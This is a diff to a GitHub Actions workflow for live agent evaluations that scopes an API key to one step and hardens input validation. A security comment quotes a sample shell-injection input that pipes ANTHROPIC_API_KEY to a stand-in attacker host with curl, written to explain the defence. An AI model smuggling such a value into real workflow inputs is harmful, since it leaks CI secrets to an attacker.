@@ -32,8 +32,6 @@ jobs:
     name: eval:live
     runs-on: ubuntu-latest
     timeout-minutes: 60
-    env:
-      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
     steps:
       - uses: actions/checkout@v7
       - uses: pnpm/action-setup@v6
@@ -47,7 +45,7 @@ jobs:
       # dist is consumed) and the CLI itself runs from src via tsx.
       #
       # SECURITY: `inputs.*` are attacker-controlled (anyone who can dispatch
-      # this workflow chooses them) and this job's `env` holds a real
+      # this workflow chooses them) and this step's `env` holds a real
       # ANTHROPIC_API_KEY. They are therefore NEVER interpolated into `run:`
       # command text (that would be a shell-injection vector: e.g. a `k` of
       # `1 && curl -d @- https://evil/ <<< $ANTHROPIC_API_KEY` would execute
@@ -57,18 +55,19 @@ jobs:
       # into a string that could re-enter the shell as syntax.
       - name: eval:live
         env:
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           INPUT_K: ${{ inputs.k }}
           INPUT_MAX_CALLS: ${{ inputs.max_calls }}
           INPUT_CATEGORY: ${{ inputs.category }}
         run: |
           set -euo pipefail
 
-          args=()
+          args=(--filter @apo/agent-evals eval:live)
 
           if [[ -n "${INPUT_K}" ]]; then
             if [[ ! "${INPUT_K}" =~ ^[0-9]+$ ]]; then
               echo "eval:live: k must be a positive integer, got: ${INPUT_K}" >&2
-              exit 1
+              exit 3
             fi
             args+=(--k "${INPUT_K}")
           fi
@@ -76,7 +75,7 @@ jobs:
           if [[ -n "${INPUT_MAX_CALLS}" ]]; then
             if [[ ! "${INPUT_MAX_CALLS}" =~ ^[0-9]+$ ]]; then
               echo "eval:live: max_calls must be a positive integer, got: ${INPUT_MAX_CALLS}" >&2
-              exit 1
+              exit 3
             fi
             args+=(--max-calls "${INPUT_MAX_CALLS}")
           fi
@@ -84,12 +83,12 @@ jobs:
           if [[ -n "${INPUT_CATEGORY}" ]]; then
             if [[ ! "${INPUT_CATEGORY}" =~ ^[a-zA-Z0-9_-]+$ ]]; then
               echo "eval:live: category must be alphanumeric (with - or _), got: ${INPUT_CATEGORY}" >&2
-              exit 1
+              exit 3
             fi
             args+=(--category "${INPUT_CATEGORY}")
           fi
 
-          pnpm --filter @apo/agent-evals eval:live "${args[@]}"
+          pnpm "${args[@]}"
       # if: always() so the report of a run that hit a safety violation (exit
       # 1) is still uploaded — exactly when someone needs to read it. This
       # job's own exit code is deliberately NOT translated into a required
@@ -100,4 +99,4 @@ jobs:
         with:
           name: agent-evals-live-report
           path: packages/agent-evals/reports/
-          if-no-files-found: error
+          if-no-files-found: warn
